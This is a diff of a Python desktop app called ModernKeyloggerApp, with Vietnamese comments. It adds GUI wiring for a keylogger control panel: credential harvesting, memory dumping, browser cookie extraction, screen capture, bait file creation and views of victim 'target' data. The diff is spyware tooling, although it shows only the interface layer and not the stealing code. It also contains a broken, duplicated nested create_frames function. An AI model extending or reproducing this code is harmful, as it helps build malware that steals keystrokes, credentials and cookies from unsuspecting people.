@@ -35,6 +35,13 @@ from gui.frames.bait_frame import BaitFrame
 from gui.frames.cookie_frame import CookieFrame
 from gui.frames.settings_frame import SettingsFrame
 from gui.frames.about_frame import AboutFrame
+from gui.frames.screenshot_frame import ScreenshotFrame
+# Thêm vào phần import các module trích xuất (khoảng dòng 20)
+from extractors.browser_cookie_extractor import BrowserCookieExtractor
+# Thêm dòng mới ở đây:
+from extractors.memory_dump import MemoryDumper
+from extractors.credential_harvester import CredentialHarvester
+
 
 # Import cấu hình
 from config import config
@@ -137,14 +144,32 @@ class ModernKeyloggerApp:
     def _update_log_display(self, log_entry: str):
         def append_log():
             try:
+                # Tìm đối tượng KeyloggerFrame
+                if hasattr(self, "frame_widgets") and "keylogger" in self.frame_widgets:
+                    keylogger_frame = self.frame_widgets["keylogger"]
+                    if hasattr(keylogger_frame, "update_log"):
+                        keylogger_frame.update_log(log_entry)
+                        return
+
+                # Backup: Tìm trực tiếp widget
                 frame = self.frames.get("keylogger")
-                if frame and hasattr(frame, "log_textbox"):
-                    frame.log_textbox.configure(state="normal")
-                    frame.log_textbox.insert("end", log_entry + "\n")
-                    frame.log_textbox.see("end")
-                    frame.log_textbox.configure(state="disabled")
+                if frame:
+                    # Tìm LabelFrame "Nhật ký phím"
+                    for child in frame.winfo_children():
+                        if isinstance(child, ttk.LabelFrame) and child.cget("text") == "Nhật ký phím":
+                            # Tìm trong container
+                            for container in child.winfo_children():
+                                for widget in container.winfo_children():
+                                    if isinstance(widget, tk.Text):
+                                        widget.insert(tk.END, log_entry + "\n")
+                                        widget.see(tk.END)
+                                        return
+
+                logger.debug(f"Không tìm thấy widget để hiển thị log: {log_entry}")
             except Exception as e:
+                import traceback
                 logger.error(f"Lỗi khi cập nhật giao diện keylog: {e}")
+                logger.error(traceback.format_exc())
 
         self.update_ui(append_log)
 
@@ -153,6 +178,9 @@ class ModernKeyloggerApp:
         # Dừng keylogger nếu đang chạy
         if self.keylogger and self.keylogger.running:
             self.keylogger.stop()
+        # Đóng phiên làm việc của screenshot
+        if hasattr(self, 'screenshot_frame'):
+            self.screenshot_frame.on_closing()
 
         # Đóng cửa sổ
         self.root.destroy()
@@ -197,6 +225,8 @@ class ModernKeyloggerApp:
             ("manage", "Quản lý thiết bị", "view"),
             ("bait", "Tạo file mồi", "bait"),
             ("cookie", "Trích xuất cookie", "cookie"),
+            ("screenshot", "Chụp màn hình", "camera"),  # Thêm mục mới này
+            ("credentials", "Thu thập thông tin", "key"),
             ("settings", "Cài đặt", "settings"),
             ("about", "Giới thiệu", "about"),
         ]
@@ -247,11 +277,14 @@ class ModernKeyloggerApp:
         """Tạo các frame nội dung cho từng tab."""
         # Container cho các frame
         self.frames = {}
+        self.frame_widgets = {}  # Lưu đối tượng và widget
 
         # Tạo các frame con với callback là hàm frame_callback
-        self.frames["keylogger"] = KeyloggerFrame(
+        keylogger_frame_obj = KeyloggerFrame(
             self.main_container, callback=self.frame_callback
-        ).get_frame()
+        )
+        self.frames["keylogger"] = keylogger_frame_obj.get_frame()
+        self.frame_widgets["keylogger"] = keylogger_frame_obj
 
         self.frames["manage"] = ManagementFrame(
             self.main_container, callback=self.frame_callback
@@ -272,6 +305,43 @@ class ModernKeyloggerApp:
         self.frames["about"] = AboutFrame(
             self.main_container, callback=self.frame_callback
         ).get_frame()
+        # Thêm frame chụp màn hình
+        self.screenshot_frame = ScreenshotFrame(self.main_container)  # Hoặc parent phù hợp
+        screenshot_tab = self.screenshot_frame  # Vì ScreenshotFrame thừa kế từ ttk.Frame
+        self.frames["screenshot"] = screenshot_tab
+        self.frame_widgets["screenshot"] = self.screenshot_frame
+
+        def create_frames(self) -> None:
+            """Tạo các frame nội dung cho từng tab."""
+            # Container cho các frame
+            self.frames = {}
+            self.frame_widgets = {}  # Lưu đối tượng và widget
+
+            # Tạo các frame con với callback là hàm frame_callback
+            keylogger_frame_obj = KeyloggerFrame(
+                self.main_container, callback=self.frame_callback
+            )
+            self.frames["keylogger"] = keylogger_frame_obj.get_frame()
+            self.frame_widgets["keylogger"] = keylogger_frame_obj
+
+            # ... (các frame khác) ...
+
+            # Thêm frame chụp màn hình
+            self.screenshot_frame = ScreenshotFrame(self.main_container)
+            screenshot_tab = self.screenshot_frame
+            self.frames["screenshot"] = screenshot_tab
+            self.frame_widgets["screenshot"] = self.screenshot_frame
+
+            # Thêm mới: Frame Credentials
+            # Import module
+            from gui.frames.credentials_frame import CredentialsFrame
+            # Khởi tạo frame
+            self.credentials_frame = CredentialsFrame(self.main_container, callback=self.frame_callback)
+            # Đăng ký frame với ứng dụng
+            credentials_tab = self.credentials_frame.get_frame()
+            self.frames["credentials"] = credentials_tab
+            self.frame_widgets["credentials"] = self.credentials_frame
+
 
     def show_frame(self, frame_id: str) -> None:
         """Hiển thị frame theo ID và cập nhật trạng thái nút."""
@@ -610,21 +680,25 @@ class ModernKeyloggerApp:
 
     def update_log(self, key_event: str) -> None:
         """Cập nhật log hiển thị khi có keystroke mới.
-       
-       Args:
-           key_event: Sự kiện bàn phím
-       """
-        # Tìm frame keylogger và cập nhật log
-        for frame_id, frame in self.frames.items():
+
+        Args:
+            key_event: Sự kiện bàn phím
+        """
+        # Tìm đến đối tượng KeyloggerFrame
+        for frame_id, frame_obj in self.frames.items():
             if frame_id == "keylogger":
-                for child in frame.winfo_children():
-                    if hasattr(child, "update_log"):
-                        child.update_log(key_event)
-                    elif hasattr(child, "winfo_children"):
-                        for subchild in child.winfo_children():
-                            if hasattr(subchild, "update_log"):
-                                subchild.update_log(key_event)
-                break
+                # Tìm trong các widget con của frame
+                for child in frame_obj.winfo_children():
+                    if isinstance(child, ttk.LabelFrame) and child.cget("text") == "Nhật ký phím":
+                        for container in child.winfo_children():
+                            for widget in container.winfo_children():
+                                if isinstance(widget, tk.Text):
+                                    widget.insert(tk.END, key_event + "\n")
+                                    widget.see(tk.END)
+                                    return
+
+        # Log lỗi nếu không tìm thấy widget
+        logger.error(f"Không thể tìm thấy widget để hiển thị log: {key_event}")
 
     def view_target_data(self, target_id: int) -> None:
         """Xem dữ liệu của một target.
